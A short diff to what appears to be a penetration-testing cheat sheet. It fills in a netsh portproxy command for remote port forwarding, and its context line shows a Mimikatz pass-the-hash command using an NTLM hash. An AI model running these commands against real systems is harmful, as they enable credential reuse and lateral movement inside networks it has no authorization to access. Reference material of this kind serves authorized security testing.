@@ -328,7 +328,7 @@ sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<HASH> /run:"C:\windows\system
 #### Remote port forward netsh
 - Requires administrator privs
 ```
-netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
+netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=<PORT> connectaddress=<TARGET IP> connectport=<TARGET PORT> protocol=tcp
 ```
 
 #### List forwards netsh
